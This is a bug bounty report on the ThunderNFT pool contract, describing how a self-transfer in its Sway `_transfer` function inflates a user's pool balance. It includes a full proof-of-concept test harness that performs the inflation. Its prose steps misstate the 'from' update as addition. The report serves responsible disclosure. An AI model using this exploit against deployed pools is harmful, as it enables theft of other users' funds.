# IOP \_ ThunderNFT 34659 - \[Smart Contract - Low] Pool Balance Inflation

## Pool Balance Inflation

Submitted on Mon Aug 19 2024 23:04:18 GMT-0400 (Atlantic Standard Time) by @Blockian for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34659

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/pool>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

### Description

## Thunder Exchange

### Pool Balance Inflation

#### Description

A issue exists where pool balances can be artificially inflated without any additional deposits. This flaw enables malicious actors to withdraw inflated funds, effectively stealing from the pool.

### Root Cause

The vulnerability stems from the current implementation of the transfer function, as shown below:

```rs
#[storage(read, write)]
fn _transfer(from: Identity, to: Identity, asset: AssetId, amount: u64) {
    // ...
    let from_balance = _balance_of(from, asset);
    let to_balance = _balance_of(to, asset);
    require(from_balance >= amount, PoolErrors::AmountHigherThanBalance);

    storage.balance_of.insert((from, asset), from_balance - amount);
    storage.balance_of.insert((to, asset), to_balance + amount);

    log(Transfer {
        from,
        to,
        asset,
        amount,
    });
}
```

The transfer process operates as follows:

1. Read the `from` balance
2. Read the `to` balance
3. Update the `from` balance to `from + amount`
4. Update the `to` balance to `to + amount`

However, if `from` and `to` are the same account, the update in step 3 is effectively overwritten by the update in step 4. As a result, the attacker retains their original balance plus the transferred amount.

### Impact

This vulnerability allows the creation of inflated balances without corresponding funds. When a user with such an inflated balance withdraws from the pool, they can deplete the pool's reserves, leaving other users unable to withdraw their legitimate funds.

But, currently, the impact is classified as Low, since the `transfer` function can only be invoked by the `ThunderExchange` itself, which is not malicious.

### Proposed fix

There are two primary solutions to address this issue:

1. Ensure that from and to are not the same account.
2. Adjust the order of operations as follows:
   1. Read the `from` balance
   2. Update the `from` balance to `from + amount`
   3. Read the `to` balance
   4. Update the `to` balance to `to + amount`

### Proof of concept

## Proof of Concept

There are some steps to follow:

* Create `forc.toml` in `contracts-v1` and add the below in the `forc.toml`:

```rs
[workspace]
members = ["tests", "asset_manager", "erc721", "execution_manager", "execution_strategies/strategy_fixed_price_sale" ,"libraries", "interfaces" , "pool", "royalty_manager", "thunder_exchange", "test_asset", "test_user"]
```

* Create 3 new folder called `tests`, `test_user`, and `test_asset` under the `contracts-v1` directory:
* In the each folder create a folder named `src` with a file called `main.sw`, and a `forc.toml` file. The folder tree will look like this:

```bash
contracts-v1
├── test_asset
│   ├── forc.toml
│   └── src
│       └── main.sw
├── test_user
│   ├── forc.toml
│   └── src
│       └── main.sw
├── tests
│   ├── forc.toml
│   └── src
│       └── main.sw
```

#### tests folder

In the `tests` folder.

* Add the below in the `forc.toml`:

```rs
[project]
authors = ["Blockian"]
entry = "main.sw"
license = "Apache-2.0"
name = "test_contract"

[dependencies]
standards = { git = "https://github.com/FuelLabs/sway-standards", tag = "v0.4.4" }
interfaces = { path = "../interfaces" }
libraries = { path = "../libraries" }


[contract-dependencies]

asset_manager = { path = "../asset_manager" }

thunder_exchange = { path = "../thunder_exchange" }

pool = { path = "../pool" }

execution_manager = { path = "../execution_manager" }

royalty_manager = { path = "../royalty_manager" }

strategy_fixed_price_sale = {path = "../execution_strategies/strategy_fixed_price_sale"}

test_asset = { path = "../test_asset" }

test_user = { path = "../test_user" }
```

* Add the below in the `main.sw`:

```rs
contract;

use interfaces::{
  thunder_exchange_interface::{ThunderExchange},
  royalty_manager_interface::*,
  asset_manager_interface::*,
  execution_manager_interface::ExecutionManager,
  execution_strategy_interface::*,
  pool_interface::Pool,
  test_user_interface::TestUser,
};

use libraries::{
  msg_sender_address::*,
  constants::*,
  order_types::*,
  ownable::*,
};

use standards::{src3::SRC3};

use std::{
  block::timestamp,
  auth::*,
  call_frames::*,
  context::*,
  contract_id::ContractId,
  constants::DEFAULT_SUB_ID,
  logging::log,
  revert::require,
  assert::*,
  storage::storage_map::*,
  asset::*
};

#[test()]
fn test_attack() {
  let caller = caller_address().unwrap();

  let asset_mngr = abi(AssetManager, asset_manager::CONTRACT_ID);
  let pool = abi(Pool, pool::CONTRACT_ID);
  let test_user = abi(TestUser, test_user::CONTRACT_ID);
  let test_user_identity = Identity::ContractId(ContractId::from(test_user::CONTRACT_ID));

  asset_mngr.initialize();
  test_user.initialize(ContractId::from(pool::CONTRACT_ID));
  
  // set the test user as the exchange for the pool for this test
  pool.initialize(ContractId::from(test_user::CONTRACT_ID), ContractId::from(asset_manager::CONTRACT_ID));

  // mint tokens to the user
  let example_asset = abi(SRC3, test_asset::CONTRACT_ID);
  let asset_id = AssetId::new(ContractId::from(test_asset::CONTRACT_ID), DEFAULT_SUB_ID);

  asset_mngr.add_asset(asset_id);
  example_asset.mint(test_user_identity, DEFAULT_SUB_ID, 1000); // mint 1000 tokens to the test user

  // test user deposits to pool
  test_user.deposit_to_pool_attack(asset_id, 1000);

  assert(pool.balance_of(test_user_identity, asset_id) == 2000); // inflated balance
}
```

#### test\_user folder

In the `test_user` folder.

* Add the below in the `forc.toml`:

```rs
[project]
authors = ["Blockian"]
entry = "main.sw"
license = "Apache-2.0"
name = "test_user"

[dependencies]
interfaces = { path = "../interfaces" }
libraries = { path = "../libraries" }
standards = { git = "https://github.com/FuelLabs/sway-standards", tag = "v0.4.4" }
```

* Add the below in the `main.sw`:

```rs
contract;

use std::{
    address::Address,
    auth::*,
    call_frames::*,
    constants::*,
    context::*,
    contract_id::ContractId,
    hash::Hash,
    logging::log,
    identity::Identity,
    revert::*,
    asset::*,
    storage::storage_map::*,
};

use interfaces::{
    asset_manager_interface::*,
    pool_interface::*,
    test_user_interface::*,
    thunder_exchange_interface::{ThunderExchange},
};

use libraries::{
    msg_sender_address::*,
    constants::*,
    order_types::*,
};

storage {
    /// Pool contractId
    pool: Option<ContractId> = Option::None,
}

impl TestUser for Contract {
    #[storage(read, write)]
    fn initialize(pool: ContractId) {
        storage.pool.write(Option::Some(pool));
    }

    #[storage(read)]
    fn deposit_to_pool_attack(asset: AssetId, amount: u64) {
        let pool_addr = storage.pool.read().unwrap().bits();
        let pool = abi(Pool, pool_addr);
        let self_identity = Identity::ContractId(ContractId::this());

        pool.deposit{ asset_id: asset.bits(), coins: amount }();
        pool.transfer_from(self_identity, self_identity, asset, 1000);
    }
}
```

#### test\_asset folder

In the `test_asset` folder. The test asset is simply the Fuel Team SRC3 [example](https://github.com/FuelLabs/sway-standards/blob/master/examples/src3-mint-burn/multi_asset/src/multi_asset.sw)

* Add the below in the `forc.toml`:

```rs
[project]
authors = ["Blockian"]
entry = "main.sw"
license = "Apache-2.0"
name = "test_asset"

[dependencies]
standards = { git = "https://github.com/FuelLabs/sway-standards", tag = "v0.4.4" }
```

* Add the below in the `main.sw`:

````rs
contract;

use standards::{src20::SRC20, src3::SRC3};
use std::{
    asset::{
        burn,
        mint_to,
    },
    call_frames::msg_asset_id,
    context::msg_amount,
    hash::Hash,
    storage::storage_string::*,
    string::String,
};

// In this example, all assets minted from this contract have the same decimals, name, and symbol
configurable {
    /// The decimals of every asset minted by this contract.
    DECIMALS: u8 = 9u8,
    /// The name of every asset minted by this contract.
    NAME: str[12] = __to_str_array("ExampleAsset"),
    /// The symbol of every asset minted by this contract.
    SYMBOL: str[2] = __to_str_array("EA"),
}

storage {
    /// The total number of distinguishable assets this contract has minted.
    total_assets: u64 = 0,
    /// The total supply of a particular asset.
    total_supply: StorageMap<AssetId, u64> = StorageMap {},
}

impl SRC3 for Contract {
    /// Unconditionally mints new assets using the `sub_id` sub-identifier.
    ///
    /// # Arguments
    ///
    /// * `recipient`: [Identity] - The user to which the newly minted asset is transferred to.
    /// * `sub_id`: [SubId] - The sub-identifier of the newly minted asset.
    /// * `amount`: [u64] - The quantity of coins to mint.
    ///
    /// # Number of Storage Accesses
    ///
    /// * Reads: `2`
    /// * Writes: `2`
    ///
    /// # Examples
    ///
    /// ```sway
    /// use src3::SRC3;
    /// use std::constants::DEFAULT_SUB_ID;
    ///
    /// fn foo(contract_id: ContractId) {
    ///     let contract_abi = abi(SRC3, contract_id);
    ///     contract_abi.mint(Identity::ContractId(contract_id), DEFAULT_SUB_ID, 100);
    /// }
    /// ```
    #[storage(read, write)]
    fn mint(recipient: Identity, sub_id: SubId, amount: u64) {
        let asset_id = AssetId::new(ContractId::this(), sub_id);

        // If this SubId is new, increment the total number of distinguishable assets this contract has minted.
        let asset_supply = storage.total_supply.get(asset_id).try_read();
        match asset_supply {
            None => {
                storage.total_assets.write(storage.total_assets.read() + 1)
            },
            _ => {},
        }

        // Increment total supply of the asset and mint to the recipient.
        storage
            .total_supply
            .insert(asset_id, amount + asset_supply.unwrap_or(0));
        mint_to(recipient, sub_id, amount);
    }

    /// Unconditionally burns assets sent with the `sub_id` sub-identifier.
    ///
    /// # Arguments
    ///
    /// * `sub_id`: [SubId] - The sub-identifier of the asset to burn.
    /// * `amount`: [u64] - The quantity of coins to burn.
    ///
    /// # Number of Storage Accesses
    ///
    /// * Reads: `1`
    /// * Writes: `1`
    ///
    /// # Reverts
    ///
    /// * When the transaction did not include at least `amount` coins.
    /// * When the asset included in the transaction does not have the SubId `sub_id`.
    ///
    /// # Examples
    ///
    /// ```sway
    /// use src3::SRC3;
    /// use std::constants::DEFAULT_SUB_ID;
    ///
    /// fn foo(contract_id: ContractId, asset_id: AssetId) {
    ///     let contract_abi = abi(SRC3, contract_id);
    ///     contract_abi {
    ///         gas: 10000,
    ///         coins: 100,
    ///         asset_id: asset_id,
    ///     }.burn(DEFAULT_SUB_ID, 100);
    /// }
    /// ```
    #[payable]
    #[storage(read, write)]
    fn burn(sub_id: SubId, amount: u64) {
        let asset_id = AssetId::new(ContractId::this(), sub_id);
        require(msg_amount() == amount, "Incorrect amount provided");
        require(msg_asset_id() == asset_id, "Incorrect asset provided");

        // Decrement total supply of the asset and burn.
        storage
            .total_supply
            .insert(asset_id, storage.total_supply.get(asset_id).read() - amount);
        burn(sub_id, amount);
    }
}

// SRC3 extends SRC20, so this must be included
impl SRC20 for Contract {
    #[storage(read)]
    fn total_assets() -> u64 {
        storage.total_assets.read()
    }

    #[storage(read)]
    fn total_supply(asset: AssetId) -> Option<u64> {
        storage.total_supply.get(asset).try_read()
    }

    #[storage(read)]
    fn name(asset: AssetId) -> Option<String> {
        match storage.total_supply.get(asset).try_read() {
            Some(_) => Some(String::from_ascii_str(from_str_array(NAME))),
            None => None,
        }
    }

    #[storage(read)]
    fn symbol(asset: AssetId) -> Option<String> {
        match storage.total_supply.get(asset).try_read() {
            Some(_) => Some(String::from_ascii_str(from_str_array(SYMBOL))),
            None => None,
        }
    }

    #[storage(read)]
    fn decimals(asset: AssetId) -> Option<u8> {
        match storage.total_supply.get(asset).try_read() {
            Some(_) => Some(DECIMALS),
            None => None,
        }
    }
}
````

#### Interfaces

Now we need to add the `test_user` interface to interact with. In the `interfaces/src` folder, in the `lib.sw` add the following line:

```rs
pub mod test_user_interface;
```

Additionally, create a file called `test_user_interface.sw` in the `interfaces/src` folder and add the following:

```rs
library;

use libraries::{
    order_types::*,
};

abi TestUser {
    #[storage(read, write)]
    fn initialize(pool: ContractId);

    #[storage(read)]
    fn deposit_to_pool_attack(asset: AssetId, amount: u64);
}
```

#### Run it all!

Simply run `forc test` in `smart-contracts/contracts-v1`.
